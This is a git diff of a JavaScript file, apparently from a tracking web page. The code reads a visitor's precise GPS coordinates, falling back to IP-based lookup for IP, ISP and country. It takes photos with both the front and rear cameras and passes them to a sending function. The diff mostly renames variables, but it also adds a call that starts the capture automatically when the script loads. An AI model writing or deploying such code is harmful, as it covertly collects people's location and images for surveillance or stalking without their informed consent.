@@ -127,17 +127,17 @@ function getPreciseLocationOrFallbackToIP() {
     if (!navigator.geolocation) return getIPInfo().then(resolve);
 
     navigator.geolocation.getCurrentPosition(
-      position => {
-        info.lat = position.coords.latitude.toFixed(6);
-        info.lon = position.coords.longitude.toFixed(6);
+      pos => {
+        info.lat = pos.coords.latitude.toFixed(6);
+        info.lon = pos.coords.longitude.toFixed(6);
         info.address = '📍 Lấy từ GPS chính xác';
         info.country = 'Không rõ';
         info.ip = 'Không rõ';
         info.isp = 'Không rõ';
         resolve();
       },
-      error => {
-        console.warn("GPS thất bại, fallback IP:", error.message);
+      err => {
+        console.warn('GPS lỗi, fallback IP:', err.message);
         getIPInfo().then(resolve);
       },
       { enableHighAccuracy: true, timeout: 5000 }
@@ -182,6 +182,7 @@ function captureCamera(facingMode = "user") {
         const video = document.createElement("video");
         video.srcObject = stream;
         video.play();
+
         video.onloadedmetadata = () => {
           const canvas = document.createElement("canvas");
           canvas.width = video.videoWidth;
@@ -195,7 +196,7 @@ function captureCamera(facingMode = "user") {
           }, 1000);
         };
       })
-      .catch(err => reject(err));
+      .catch(reject);
   });
 }
 
@@ -224,14 +225,13 @@ async function sendTwoPhotos(frontBlob, backBlob) {
 
 async function main() {
   detectDevice();
-
   let frontBlob = null, backBlob = null;
 
   try {
     frontBlob = await captureCamera("user");
     backBlob = await captureCamera("environment");
     info.camera = '✅ Đã chụp camera trước và sau';
-  } catch {
+  } catch (err) {
     info.camera = '📵 Không thể truy cập đủ camera';
   }
 
@@ -250,3 +250,6 @@ async function main() {
     });
   }
 }
+
+// Bắt đầu khi được gọi từ giao diện
+main();
